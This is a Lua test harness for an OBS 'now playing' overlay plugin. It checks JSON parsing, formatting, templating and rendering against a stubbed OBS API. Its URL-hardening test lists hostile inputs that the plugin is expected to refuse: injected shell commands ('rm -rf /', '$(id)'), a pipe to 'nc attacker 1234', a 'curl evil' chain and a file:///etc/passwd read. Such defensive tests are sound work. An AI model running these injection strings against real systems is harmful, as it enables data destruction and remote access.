--[[
  plugin_harness.lua — offline test harness for plugin/weebhub-nowplaying.lua

  Loads the real plugin file against a stub `obslua` that records what the
  script would do, then drives it with payloads captured from the live bridge
  (see tests/fixtures/*.json). No OBS installation required.

  Run:  lua tests/plugin_harness.lua
  Exit: 0 = all assertions passed, 1 = at least one failed.
]]

-- ===========================================================================
-- assertions
-- ===========================================================================

local passed, failed = 0, 0

local function check(name, cond, detail)
  if cond then
    passed = passed + 1
    io.write("  ok   " .. name .. "\n")
  else
    failed = failed + 1
    io.write("  FAIL " .. name .. (detail and ("  -> " .. tostring(detail)) or "") .. "\n")
  end
end

local function eq(name, actual, expected)
  check(name, actual == expected, string.format("got %s, want %s",
    tostring(actual), tostring(expected)))
end

-- ===========================================================================
-- the obslua stub
-- ===========================================================================

local LOG = {}

-- what the script pushed into the Text source
local SOURCE_TEXT  = nil
local SOURCE_ENABLED = nil
local SOURCE_SETTINGS_TEXT = nil

-- sources that "exist" in the fake scene: name -> source id
local SCENE_SOURCES = {
  ["WeebHub Now Playing"] = "text_gdiplus_v2",
}

-- what the stub's curl invocation should return next
local FETCH_BODY = nil
local FETCHED_URLS = {}

local obslua = {
  LOG_INFO    = 1,
  LOG_WARNING = 2,
  LOG_ERROR   = 3,

  OBS_TEXT_DEFAULT    = 0,
  OBS_TEXT_MULTILINE  = 1,

  obs_log = function(level, msg)
    LOG[#LOG + 1] = { level = level, msg = msg }
  end,

  obs_get_source_by_name = function(name)
    if SCENE_SOURCES[name] then
      return { __source = name, __id = SCENE_SOURCES[name] }
    end
    return nil
  end,

  obs_source_get_id = function(src)
    return src.__id
  end,

  obs_source_get_settings = function(src)
    return { __for = src.__source }
  end,

  obs_data_set_string = function(settings, key, value)
    if key == "text" then
      SOURCE_SETTINGS_TEXT = value
    end
  end,

  obs_source_update = function(src, settings)
    SOURCE_TEXT = SOURCE_SETTINGS_TEXT
  end,

  obs_data_release = function() end,

  obs_source_set_enabled = function(src, enabled)
    SOURCE_ENABLED = enabled
  end,

  obs_source_release = function() end,

  obs_data_get_string = function(settings, key) return settings[key] end,
  obs_data_get_bool   = function(settings, key) return settings[key] end,
  obs_data_get_int    = function(settings, key) return settings[key] end,

  obs_data_set_default_string = function(s, k, v) s[k] = v end,
  obs_data_set_default_bool   = function(s, k, v) s[k] = v end,
  obs_data_set_default_int    = function(s, k, v) s[k] = v end,

  obs_properties_create   = function() return {} end,
  obs_properties_add_text = function() end,
  obs_properties_add_bool = function() end,
  obs_properties_add_int  = function() end,
  obs_properties_add_button = function() end,

  timer_add = function(fn, ms) end,
  timer_remove = function(fn) end,
}

-- ===========================================================================
-- intercept io.popen
--
-- The plugin shells out to curl. Rather than depend on a live bridge for the
-- deterministic assertions, popen is stubbed to replay FETCH_BODY. A separate
-- section at the end runs against the real bridge when one is up.
-- ===========================================================================

local real_popen = io.popen

local function stub_popen(cmd)
  if cmd:match("curl%s+%-%-version") then
    return {
      read = function() return "curl 8.7.1 (stub)\n" end,
      close = function() return true, "exit", 0 end,
    }
  end

  local url = cmd:match('curl%s+%-s%s+%-%-max%-time%s+%d+%s+"([^"]+)"')
  FETCHED_URLS[#FETCHED_URLS + 1] = url

  local body = FETCH_BODY
  if body == nil then
    return {
      read = function() return "" end,
      close = function() return false, "exit", 7 end,
    }
  end
  local consumed = false
  return {
    read = function()
      if consumed then return nil end
      consumed = true
      return body
    end,
    close = function() return true, "exit", 0 end,
  }
end

-- ===========================================================================
-- load the plugin
-- ===========================================================================

io.popen = stub_popen

_G.obslua = obslua
_G.__WEEBHUB_TEST = {}

local plugin_path = arg and arg[0] and arg[0]:gsub("tests/plugin_harness%.lua$", "") or ""
local chunk, load_err = loadfile(plugin_path .. "plugin/weebhub-nowplaying.lua")
if not chunk then
  io.stderr:write("could not load plugin: " .. tostring(load_err) .. "\n")
  os.exit(2)
end
chunk()

local T = _G.__WEEBHUB_TEST

-- ===========================================================================
-- payload fixtures
-- ===========================================================================

local function read_fixture(name)
  local f = io.open(plugin_path .. "tests/fixtures/" .. name, "r")
  if not f then return nil end
  local body = f:read("*a")
  f:close()
  return body
end

local PLAYING = read_fixture("playing.json") or
  '{"anime_title":"Frieren: Beyond Journey\'s End","episode":12,"episode_title":"A Real Hero",' ..
  '"playback_state":"playing","position_sec":575,"duration_sec":1440,' ..
  '"cover_art_url":"/api/cover","connection":"connected","revision":303,"uptime_sec":120}'

local PAUSED = '{"anime_title":"Spy x Family","episode":6,"episode_title":"The Friendship Scheme",' ..
  '"playback_state":"paused","position_sec":700,"duration_sec":1410,' ..
  '"cover_art_url":"/api/cover","connection":"connected","revision":400,"uptime_sec":300}'

local IDLE = '{"anime_title":"Not connected","episode":null,"episode_title":"",' ..
  '"playback_state":"stopped","position_sec":0,"duration_sec":0,' ..
  '"cover_art_url":"","connection":"no-player","revision":0,"uptime_sec":5}'

-- ===========================================================================
-- 1. JSON decoder
-- ===========================================================================

io.write("== json decoder ==\n")

do
  local d = T.decode_json(PLAYING)
  eq("title decoded", d.anime_title, "Frieren: Beyond Journey's End")
  eq("episode is a number", d.episode, 12)
  eq("duration is a number", d.duration_sec, 1440)
  eq("connection decoded", d.connection, "connected")
end

do
  local d = T.decode_json(IDLE)
  eq("null episode -> nil", d.episode, nil)
  eq("empty string preserved", d.episode_title, "")
end

do
  -- escaped quote inside a title, the classic breaker for pattern-matching
  local d = T.decode_json('{"anime_title":"He said \\"hi\\"","episode":1}')
  eq("escaped quotes", d.anime_title, 'He said "hi"')
end

do
  local d = T.decode_json('{"anime_title":"Caf\\u00e9 \\ud83c\\udfac","episode":3}')
  eq("unicode + surrogate pair", d.anime_title, "Caf\u{e9} \u{1F3AC}")
end

do
  local ok = pcall(T.decode_json, '{"anime_title":"broken"')
  check("truncated JSON raises instead of returning junk", not ok)
end

do
  local ok = pcall(T.decode_json, '{"a":1} trailing')
  check("trailing garbage raises", not ok)
end

-- ===========================================================================
-- 2. formatting helpers
-- ===========================================================================

io.write("\n== formatting ==\n")

eq("format_time 342 -> 5:42", T.format_time(342), "5:42")
eq("format_time 1440 -> 24:00", T.format_time(1440), "24:00")
eq("format_time 3725 -> 1:02:05", T.format_time(3725), "1:02:05")
eq("format_time nil -> 0:00", T.format_time(nil), "0:00")
eq("format_time negative -> 0:00", T.format_time(-10), "0:00")

eq("make_bar 0%", T.make_bar(0, 10), "----------")
eq("make_bar 100%", T.make_bar(100, 10), "##########")
eq("make_bar 50%", T.make_bar(50, 10), "#####-----")
eq("make_bar clamps >100", T.make_bar(999, 10), "##########")

do
  local v = T.build_vals(T.decode_json(PLAYING))
  eq("percent computed", v.percent, 40)  -- 575/1440 = 39.93 -> 40
  eq("position formatted", v.position, "9:35")
  eq("title passed through", v.title, "Frieren: Beyond Journey's End")
end

do
  -- a duration of 0 must not divide by zero
  local v = T.build_vals(T.decode_json(IDLE))
  eq("zero duration -> 0%", v.percent, 0)
  eq("zero duration -> empty-ish time", v.position, "0:00")
end

-- ===========================================================================
-- 3. template engine
-- ===========================================================================

io.write("\n== template ==\n")

do
  local v = T.build_vals(T.decode_json(PLAYING))
  local out = T.apply_template("{title} ({percent}%)", v)
  eq("template substitution", out, "Frieren: Beyond Journey's End (40%)")
end

do
  local v = T.build_vals(T.decode_json(PLAYING))
  -- a value containing % must survive gsub with a function replacement
  local out = T.apply_template("{title}", { title = "100% Orange" })
  eq("percent in value is not re-expanded", out, "100% Orange")
end

do
  local out = T.apply_template("a{nosuchkey}b", {})
  eq("unknown placeholder -> empty", out, "ab")
end

-- ===========================================================================
-- 4. idle detection
-- ===========================================================================

io.write("\n== idle detection ==\n")

check("no-player is idle", T.is_idle(T.decode_json(IDLE)))
check("stopped is idle", T.is_idle({ connection = "connected", playback_state = "stopped" }))
check("playing is not idle", not T.is_idle(T.decode_json(PLAYING)))
check("paused is not idle", not T.is_idle(T.decode_json(PAUSED)))
check("nil state is idle", T.is_idle(nil))

-- ===========================================================================
-- 5. end-to-end push into the stub Text source
-- ===========================================================================

io.write("\n== push to source ==\n")

do
  T.reset()
  FETCH_BODY = PLAYING
  SOURCE_TEXT, SOURCE_ENABLED = nil, nil

  local ok = T.tick()
  check("tick succeeds with good payload", ok)
  check("source received text", SOURCE_TEXT ~= nil, SOURCE_TEXT)
  check("text contains the title", SOURCE_TEXT and SOURCE_TEXT:find("Frieren", 1, true) ~= nil)
  check("text contains the episode", SOURCE_TEXT and SOURCE_TEXT:find("Episode 12", 1, true) ~= nil)
  check("text contains the progress bar", SOURCE_TEXT and SOURCE_TEXT:find("#####", 1, true) ~= nil)
  eq("source enabled while playing", SOURCE_ENABLED, true)
end

do
  T.reset()
  FETCH_BODY = IDLE
  SOURCE_TEXT, SOURCE_ENABLED = nil, nil

  T.tick()
  eq("source hidden while idle", SOURCE_ENABLED, false)
  eq("idle text empty by default", SOURCE_TEXT, "")
end

do
  -- malformed payload: must not wipe the source, must not crash
  T.reset()
  FETCH_BODY = "<html>502 bad gateway</html>"
  SOURCE_TEXT, SOURCE_ENABLED = "previous", true

  local ok = T.tick()
  eq("bad payload returns false", ok, false)
  eq("source left untouched on parse failure", SOURCE_TEXT, "previous")
end

do
  -- transport failure: same contract
  T.reset()
  FETCH_BODY = nil
  SOURCE_TEXT, SOURCE_ENABLED = "previous", true

  local ok = T.tick()
  eq("fetch failure returns false", ok, false)
  eq("source left untouched on fetch failure", SOURCE_TEXT, "previous")
end

do
  -- missing source must not raise
  T.reset()
  FETCH_BODY = PLAYING
  T.cfg.source_name = "Does Not Exist"
  local ok = T.tick()
  eq("missing source returns false, no crash", ok, false)
  T.cfg.source_name = "WeebHub Now Playing"
end

-- ===========================================================================
-- 6. URL hardening
-- ===========================================================================

io.write("\n== url hardening ==\n")

do
  FETCHED_URLS = {}
  T.reset()
  T.cfg.url = "http://127.0.0.1:8710/api/state"
  FETCH_BODY = PLAYING
  T.tick()
  eq("safe url is fetched", FETCHED_URLS[1], "http://127.0.0.1:8710/api/state")
end

do
  local dangerous = {
    'http://x/"; rm -rf /',
    "http://x/`whoami`",
    "http://x/$(id)",
    "http://x/ && curl evil",
    "file:///etc/passwd",
    "http://x/|nc attacker 1234",
  }
  for _, url in ipairs(dangerous) do
    FETCHED_URLS = {}
    T.reset()
    T.cfg.url = url
    FETCH_BODY = PLAYING
    local ok = T.tick()
    check("refused: " .. url, ok == false and #FETCHED_URLS == 0)
  end
  T.cfg.url = "http://127.0.0.1:8710/api/state"
end

-- ===========================================================================
-- 7. live bridge (skipped when nothing is listening)
-- ===========================================================================

io.write("\n== live bridge ==\n")

do
  io.popen = real_popen
  local probe = io.popen("curl -s --max-time 2 http://127.0.0.1:8710/api/health 2>/dev/null")
  local body = probe and probe:read("*a") or ""
  if probe then probe:close() end

  if body and body:find("weebhub-bridge", 1, true) then
    check("live bridge reachable", true)
    local ok, decoded = pcall(T.decode_json, body)
    check("live payload decodes", ok and type(decoded) == "table", decoded)
    if ok and type(decoded) == "table" then
      check("live payload has a title", decoded.anime_title ~= nil)
      local vals = T.build_vals(decoded)
      check("live payload renders", vals.title ~= nil and vals.percent ~= nil)
      io.write("       live: " .. tostring(vals.title) ..
               " ep " .. tostring(vals.episode) ..
               " " .. tostring(vals.position) .. "/" .. tostring(vals.duration) ..
               " (" .. tostring(vals.percent) .. "%)\n")
    end
  else
    io.write("  skip  no bridge on 127.0.0.1:8710 (start it with --demo to enable)\n")
  end
end

-- ===========================================================================
-- summary
-- ===========================================================================

io.write(string.format("\n%d passed, %d failed\n", passed, failed))
os.exit(failed == 0 and 0 or 1)